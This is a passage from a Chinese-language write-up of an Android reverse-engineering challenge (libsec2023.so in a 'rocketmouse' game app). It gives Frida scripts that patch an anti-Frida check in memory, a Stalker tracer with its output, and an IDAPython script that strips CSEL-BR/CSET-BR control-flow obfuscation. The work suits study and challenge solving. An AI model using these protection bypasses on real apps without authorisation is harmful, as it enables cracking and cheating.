libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;frida -H 127.0.0.1:1234 -l \"D:\\frida\\sec2023\\get_so_base.js\" -f \"com.com.sec2023.rocketmouse.mouse\" 利用下面的命令获取进程的 PID ps -A | grep mouse将得到的参数填入 rwprocmem33 中 首先对我们最感兴趣的 libil2cpp.so 调用的 libsec2023.so 的导出函数 sub_35404 下硬件断点看看，毕竟之前我们用 frida 去 hook 这个函数失败了嘛，硬件断点下的位置可以通过基址 (base)+ 偏移 (func offset) 得到 结果如下 仅仅下了五秒的硬件断点，相同地址的命中次数进入达到了百万次 我们再对不同的地址打下硬件断点看看，发现均只有一个命中地址，并且命中次数都达到百万次 与基址相减得到偏移为 0x37704 进入 ida 查看 sub_37704 函数，代码很短，按下交叉引用也没有输出 这该怎么办呢？ 还记得上面我们曾用 frida-stalker 打印出了 libsec2023.so 函数的调用链嘛，我们从 sub_37704 向上回溯看看 call135:sub_1F9ECcall136:sub_1FA34call137:sub_37940call138:sub_37974call139:sub_379A8call140:sub_1235Ccall141:sub_37134call142:sub_37184call143:sub_371ACcall144:sub_376CCcall145:sub_37704sub_37704 是被 sub_376CC 调用的， sub_376CC 中的这个 BR 跳转应该是调用了 sub_37704 再看调用 sub_376CC 的函数 sub_371AC , 在这个函数中，我们发现了一条有趣的指令， CSEL 熟悉 arm 指令集的朋友肯定知道， CSEL 是 arm 中的分支结构指令，而 BR 跳转的位置由 X8 决定，所以这段汇编便可以改变便程序控制流 CSEL X8, X8, X9, EQ 中， EQ 表示 Equal , 即相等条件，其值由最近的 CMP 的比较后得出的值决定，例如此处判断的条件就是 CMP W0, W8 用 c 语言来表示就是 if(W0 == W8)&#123; X8 = X8&#125;else&#123; X8 = X9&#125;而 X8 和 X9 相差 0x10 , X8 的修改便导致了控制流的改变 为了不让控制流转向错误的分支导致 frida 注入后强制退出，我们可以对此处的汇编进行 patch, 将 CSEL X8, X8, X9, EQ 改为 CSEL X8, X8, X8, EQ , 即将汇编 08 01 89 9A 修改为 08 01 88 9A 但是要怎么让 apk 运行我们 patch 过后的 libsec2023.so 呢？ 有以下的三种思路可以参考 反编译 apk 然后替换其中的 lib/arm64-v8a/libsec2023.so 并回编译后安装 apk 在手机安装 apk 后，在 /data/app/ 子目录中找到 libsec2023.so 的位置并予以替换 在 apk 加载 libsec2023.so 之后进行 patch 前两种方法经过尝试均以失败告终，那么现在只剩下最后一种方法了，就是在 libsec2023.so 加载之后动态 patch, 而这利用 frida 可以说简直就是轻而易举，利用 Memory.writeByteArray 就可以做到 运行 rpc.exports.anti_sec2023() 的时机是在打开 apk 之后 function anti_sec2023() &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var libso = Process.getModuleByName(\"libsec2023.so\"); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); Memory.protect(ptr(libso.base), libso.size, 'rwx'); Memory.writeByteArray(ptr(libso.base).add(0x371DC),[0x08,0x01,0x88,0x9A]); &#125;);&#125;rpc.exports = &#123; anti_sec2023: anti_sec2023&#125;;之后再次尝试对 sub_31164 附加钩子 function hook_31164()&#123; // 程序入口Java.perform(function() &#123; // 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x31164\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); console.log(args[2]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;这一次，钩子成功附加上去了！ # IDApython 去除 CSEL-BR/CSET-BR 结构 sub_31164 首先调用了 sub_3B8CC , 那我们就就去分析一下 sub_3B8CC 往下看最后一行汇编是是 BR X8 , 我们看看 BR 表示的意思是什么 BR: 跳转到某寄存器 (的值) 指向的地址（无返回）, 不会改变 lr (x30) 寄存器的值。 寄存器跳转的存在严重的阻碍了我们的逆向分析，那我们试试能不能稍稍修改一下 我们可以使用 frida-stalker 来追踪寄存器的值 (绝对不是因为我用不来 unicorn 才用 frida 的 (真的) 起初我是直接准备 patch 内存中的指令的，代码也写的差不多了 (现在被注释了), 没想到这寄存器跳转会有两种情况，没办法改成 B 跳转，不然进程会崩溃掉，所以就打印出跳转的地址手工分析咯 function addr_locate_so(addr)&#123;// 定位某个内存地址在哪个 so 里面，虽然可以直接 Process.getModuleByAddress, 但是会抛出异常所以就用函数实现了 var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return process_Obj_Module_Arr[i].name+\":0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16) &#125; &#125;&#125;function anti_BR()&#123; var libso = Process.getModuleByName(\"libsec2023.so\") var hook_addr = new NativePointer(libso.base.add(0x31164).toString()); this.tid = Process.getCurrentThreadId(); console.log('[+] hook '+hook_addr.toString()) var reg_name;//br 之后的寄存器的名称 var inst_addr; Interceptor.attach(hook_addr, &#123; onEnter: function (args) &#123; console.log(\"start Stalker!\"); // 不追踪 libc.so, 不然 frida 会报错退出.. 看堆栈回溯应该是动态编译执行了 libc.so 里面的 ptrace 才导致的异常 Stalker.exclude(&#123; \"base\": Process.getModuleByName(\"libc.so\").base, \"size\": Process.getModuleByName(\"libc.so\").size &#125;) Stalker.follow(this.tid, &#123; events: &#123; call: true, // CALL instructions: yes please ret: false, // RET instructions exec: false, // all instructions: not recommended as it's block: false, // block executed: coarse execution trace compile: false // block compiled: useful for coverage &#125;, transform: (iterator) => &#123; let instruction = iterator.next(); const startAddress = instruction.address; const isAppCode = startAddress.compare(libso.base) >= 0 &amp;&amp;startAddress.compare(libso.base.add(libso.size)) === -1; do &#123; if (isAppCode) &#123; if (instruction.mnemonic === \"br\") &#123; reg_name = instruction.opStr; inst_addr = new NativePointer(instruction.address); iterator.putCallout((context) => &#123; var addr_before = addr_locate_so(inst_addr); var addr_after = addr_locate_so(parseInt(context[reg_name],16)); if(addr_after==undefined)&#123; addr_after = \"unknown:\"+context[reg_name]; &#125; console.log(addr_before,\"jump to\",addr_after,\" \",reg_name); //Memory.patchCode(inst_addr,4,code =>&#123; //var cw = new Arm64Writer(code,&#123;pc: inst_addr&#125;); //cw.putBImm(new NativePointer(context[reg_name])); //cw.flush(); //&#125;) &#125;); &#125; &#125; iterator.keep(); &#125; while ((instruction = iterator.next()) !== null); &#125; &#125;) console.log(\"stalker end!\"); &#125;, onLeave: function (retval) &#123; Stalker.unfollow(this.tid); Stalker.garbageCollect(); &#125; &#125;); &#125;运行代码后，程序输出如下 [Remote::com.com.sec2023.rocketmouse.mouse ]-> rpc.exports.anti_BR()[+] hook 0x76cd136164[Remote::com.com.sec2023.rocketmouse.mouse ]-> start Stalker!stalker end!libsec2023.so:0x3ba00 jump to libsec2023.so:0x3ba04 x10libsec2023.so:0x3ba30 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba74 x12libsec2023.so:0x3badc jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bb2c x13libsec2023.so:0x3bb4c jump to libsec2023.so:0x3ba04 x10libsec2023.so:0x3bb4c jump to unknown:0x3 x10libsec2023.so:0x3bb4c jump to unknown:0x2 x10libsec2023.so:0x3bb4c jump to unknown:0x1 x10libsec2023.so:0x3bb4c jump to unknown:0x0 x10libsec2023.so:0x3bb4c jump to unknown:0xffffffffffffffff x10libsec2023.so:0x3bb4c jump to unknown:0x0 x10libsec2023.so:0x3bb4c jump to unknown:0x6d000000 x10libsec2023.so:0x3bb4c jump to unknown:0x6d940000 x10libsec2023.so:0x3bb4c jump to unknown:0x6d94ca00 x10libsec2023.so:0x3bb4c jump to unknown:0x6d94cae5 x10libsec2023.so:0x3bb4c jump to libsec2023.so:0x3bb50 x10libsec2023.so:0x3a08c jump to libsec2023.so:0x3a0f0 x8libsec2023.so:0x3b508 jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b550 x11libsec2023.so:0x3b5c0 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b608 x11libsec2023.so:0x3aa70 jump to libsec2023.so:0x3aa74 x8libsec2023.so:0x3aaa0 jump to libsec2023.so:0x3aaa4 x8libsec2023.so:0x3aad4 jump to libsec2023.so:0x3aad8 x8libsec2023.so:0x3ab04 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0xf28c jump to libc.so:0xb2688 x17libsec2023.so:0xf4ac jump to libc.so:0xb2bd8 x17libsec2023.so:0x3ac90 jump to libsec2023.so:0x3acc0 x11libsec2023.so:0xf40c jump to libc.so:0x4bc20 x17libsec2023.so:0xf40c jump to libc.so:0xb2688 x17libsec2023.so:0xf40c jump to libc.so:0xb2bd8 x17libsec2023.so:0x3b950 jump to libsec2023.so:0x3b95c x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3a0f0 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aa74 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aaa4 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aad8 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0x3b950 jump to unknown:0x77ea7ac3a0 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0xe x8libsec2023.so:0x3b990 jump to libsec2023.so:0x3b99c x8libsec2023.so:0x311a0 jump to libil2cpp.so:0x13b8d64 x2我们不妨以地址 0x3ba70 作为分析的示例，这里我们发现 0x3ba70 会跳转的地址有两种情况，分别是 0x3ba34 和 0x3ba74 等等， 0x3ba74 ?? 这不就是 0x3ba70 之后要执行的指令吗？ 那结果显而易见了，这 BR 寄存器跳转的前身肯定就是条件跳转， BGE , BLE 这类的指令 libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba74 x12接下来就是在 IDA 里面修复控制流咯，我们修复一下 0x3ba00 这个第一个 BR 跳转的地方，别的地方的思想都是一样的 libsec2023.so:0x3ba00 jump to libsec2023.so:0x3ba04 x10 进入到 off_72C40 , 加上 W11 得到正确的跳转，写了个简单的 python 脚本输出 hex 方便直接复制进去 red_num = 0xFFFFFFFF8C034254add_num = 0x740078FCnum = (red_num+add_num)&amp;0xffffffffmy_byte = list(num.to_bytes(8,'little'))my_byte = [hex(x)[2::].zfill(2) for x in my_byte]print(' '.join(list(my_byte)))这个地方修复完是这样的，可以看到 *(off_72C40+0) 和 *(off_72C40+0x28) 的地方值已经被我加上去了 接下来就是改是汇编了，ADD 指令我们肯定是不需要了，因为已经被我们加上去了，所以接下来继续往下走看的是这条 CSEL X10, XZR, X9, CC 指令 各个条件码的含义如下 条件码 含义 EQ Z 置位；结果相等才执行 NE Z 清零，结果不相等才执行 CS C 置位，结果无符号 &gt;= 才执行 CC C 清零，结果无符号 &lt; 才执行 MI N 置位，结果为负数才执行 PL N 清零，结果为正数或 0 才执行 VS V 置位，结果溢出才执行 VC V 清零，结果无溢出才执行 HI C 置位 Z 清零，结果为无符号数大于才执行 LS C 清零 Z 置位，结果为无符号数小于或等于才执行 GE N 等于 V，结果为有符号数大于或等于才执行 LT N 不等于 V，结果为有符号数小于才执行 GT Z 清零且 N 等于 V ，结果为有符号大于才执行 LE Z 置位或 N 不等于 V ，结果为有符号数小于或等于 AL 无条件执行。省略。 那么这里 BR 分支跳转的意思就可以表示为 if(X8 &lt; 2)&#123;// 由 CC 指令的含义知道是小于比较 B 0x3BA04// 即继续向下执行&#125;else if(X8 >= 2)&#123; B 0x3BB50// 跳转到其他地方&#125;所以这里改成 BGE , 然后把不需要的指令 NOP 掉，一处地方就修复好啦 还要注意的是，除了 CSEL-BR 结构之外，还有 CSET-BR 结构 CSET： 比较指令，满足条件，则并置 1，否则置 0 ，如： cmp w8, #2 ; 将寄存器 w8 的值和常量 2 进行比较cset w8, gt ; 如果是大于(grater than)，则将寄存器 w8 的值设置为 1，否则设置为 0 和 CSEL-BR 结构的修复思路是相似的，对于上图 ( 0x3B95C 处) 的 CSET-BR 结构，我们仅需关注这几行指令 CSET W23, NELDR X8, [X21,W23,UXTW#3]ADD X8, X8, X22BR X8其中的 LDR X8, [X21,W23,UXTW#3] 的含义可以用 C 语言这样表示 X8 = *(X21 + (W23 &lt;&lt; 3)) , UXTW#3 即将操作数左移三位的意思 这样一个一个修复过去，未免也太麻烦了，那索性就写个 idapython 脚本一键去除 CSEL-BR 和 CSET-BR 结构来解放双手吧哈哈 import ida_segmentimport idautilsimport idcimport ida_bytesfrom keystone import *def patch_nop(begin, end): # arm64 中的 NOP 指令是 b'\\x1F\\x20\\x03\\xD5' while end > begin: ida_bytes.patch_bytes(begin, b'\\x1F\\x20\\x03\\xD5') begin = begin + 4# 获取 text 段的起始地址text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x3BA34, 0x3BA80# start, end = 0x37390,0x373B4# 测试 ADRP 指令# start, end = 0x3FCE0, 0x3FD00 # 测试 EQ 情况#start, end = 0x3AA90, 0x3AAA4# start, end = 0x3A078, 0x3A090# 测试 CSET-BR 去除情况current_addr = start# print(text_seg.start_ea,text_seg.end_ea)nop_addr_array_after_finish = [] # 在 CSEL/CSET-BR 结构修复完成后需要 NOP 的指令while current_addr &lt; end: # 处理 CSEL-BR 结构 if idc.print_insn_mnem(current_addr) == \"CSEL\": CSEL_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSEL_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(9): # 向下搜寻 9 条指令，寻找是否有 BR 指令 if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break if idc.print_insn_mnem(temp_addr) == \"CSEL\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # 匹配到了 CSEL-BR 结构的汇编，需要去除 # 形如 CSEL X11, X12, X11, GE, 获取 CSEL 后的操作数 op1~3, 以及条件码 cond CSEL_op1 = idc.print_operand(CSEL_addr, 0) CSEL_op2 = idc.print_operand(CSEL_addr, 1) CSEL_op2_val = -1 CSEL_op3 = idc.print_operand(CSEL_addr, 2) CSEL_op3_val = -1 CSEL_cond = idc.print_operand(CSEL_addr, 3) # 读取条件分支语句 CSEL 中要赋值给目标寄存器的两个源寄存器中存储的值 temp_addr = idc.prev_head(CSEL_addr) while (CSEL_op2_val == -1 or CSEL_op3_val == -1) and temp_addr > text_seg.start_ea: if CSEL_op2 == \"XZR\": # 如果寄存器的值是 XZR, 说明该值为 0 CSEL_op2_val = 0 if CSEL_op3 == \"XZR\": CSEL_op3_val = 0 if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] == CSEL_op2[ 1::] and CSEL_op2_val == -1: # 寄存器 X11 和 W11 是同一个寄存器 CSEL_op2_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_operand(temp_addr, 0)[1::] == CSEL_op3[1::] and CSEL_op3_val == -1: CSEL_op3_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # print(CSEL_op2_val, CSEL_op3_val, hex(current_addr)) assert CSEL_op2_val != -1 and CSEL_op3_val != -1 temp_addr = BR_addr jump_array_reg = \"\" # 存贮跳转表的寄存器名称 jump_array_addr = -1 # 跳转表所在的位置 add_reg = [] # 加到跳转表的值所在的寄存器 add_val = -1 # 加到跳转表的值 while temp_addr > CSEL_addr: # 从后往前找，以 BR 所在的地址开始，CSEL 所在的地址结束，匹配必要的寄存器名称和值 # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": jump_array_reg = idc.print_operand(temp_addr, 1)[1:-1].split(',')[0] # 获取存储跳转表的寄存器名称 nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # 如果在 CSEL-BR 间的指令中没找到跳转表所在的位置，则向上寻找 if jump_array_addr == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP 指令，还需要加上另一部分 if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) if add_val == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg and idc.print_operand(temp_addr, 0)[0] == 'X': add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.prev_head(temp_addr) # 计算出分支跳转的两个位置 branch_a = (ida_bytes.get_qword(jump_array_addr + CSEL_op2_val) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + CSEL_op3_val) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT 有符号大于等于 vs 有符号小于 # EQ&lt;->NE 结果相等 vs 结果不相等 # CC&lt;->CS 无符号小于 vs 无符号大于等于 # HI&lt;->LS 无符号大于 vs 无符号小于等于 # if CSEL_cond == \"GE\":# 构造 B.LT 跳转 logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # 判断逻辑不取反 code = f\"B.&#123;CSEL_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # 判断逻辑取反 code = f\"B.&#123;logic_rev[CSEL_cond]&#125; #&#123;hex(branch_b)&#125;\" #print(hex(current_addr), hex(add_val), CSEL_op2_val, CSEL_op3_val, hex(jump_array_addr), code) # 修复 BR 跳转 if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSEL-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSEL-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") # 处理 CSET-BR 结构 elif idc.print_insn_mnem(current_addr) == \"CSET\": CSET_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSET_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(15): # 向下搜寻 15 条指令，寻找是否有 BR 指令 if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break elif idc.print_insn_mnem(temp_addr) == \"CSEL\": break elif idc.print_insn_mnem(temp_addr) == \"RET\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # 匹配到了 CSET-BR 结构的汇编，需要去除 # 形如 CSET W23, NE, 获取 CSET 后的操作数 op1, 以及条件码 cond CSET_op1 = idc.print_operand(CSET_addr, 0) CSET_op1_val = -1 CSET_cond = idc.print_operand(CSET_addr, 1) temp_addr = BR_addr jump_array_reg = \"\" # 存贮跳转表的寄存器名称 jump_array_addr = 0 # 跳转表所在的位置 add_reg = [] # 加到跳转表的值所在的寄存器 add_val = 0 # 加到跳转表的值 Lshift_val = -1 while temp_addr > CSET_addr: # 从后往前找，以 BR 所在的地址开始，CSET 所在的地址结束，匹配必要的寄存器名称和值 # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOVK\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": LDR_temp = idc.print_operand(temp_addr, 1)[1:-1].split(',') jump_array_reg = LDR_temp[0] # 获取存储跳转表的寄存器名称 if len(LDR_temp) == 3: Lshift_val = int(LDR_temp[2][-1:]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LSL\": if idc.print_operand(temp_addr, 0)[1::] == CSET_op1[1::]: Lshift_val = idc.get_operand_value(temp_addr, 2) temp_addr = idc.prev_head(temp_addr) # 如果在 CSET-BR 间的指令中没找到跳转表所在的位置，则向上寻找 if jump_array_addr == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP 指令，还需要加上另一部分 if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) # 向上寻找加到跳转表的值 if add_val == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # 